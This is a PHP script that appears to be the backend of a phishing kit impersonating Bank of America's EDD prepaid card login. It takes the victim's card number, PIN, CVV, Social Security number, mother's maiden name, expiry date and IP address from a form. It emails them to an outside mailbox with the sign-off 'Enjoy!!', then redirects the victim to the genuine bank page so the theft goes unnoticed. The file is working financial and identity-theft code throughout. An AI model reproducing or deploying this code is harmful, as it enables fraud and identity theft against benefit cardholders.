<?php

$subject = " EDD LOGIN CARD ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['cardnumber']."\n";
$message = "Card Number: ".$_POST["cardnumber"]."\n";
$message .= "Card Pin: ".$_POST["cardpin"]."\n";
$message .= "CVV: ".$_POST["cvv"]."\n";
$message .= "SSN: ".$_POST["ssn"]."\n";
$message .= "Mother's Maiden Name: ".$_POST["madidenname"]."\n";
$message .= "Exp MM/YY: ".$_POST["exp"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: Logins@waya.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("dswaglogs@protonmail.com",$subject,$message, $headers);



header("location: https://prepaid.bankofamerica.com/eddcard/Home/Index"); 



?>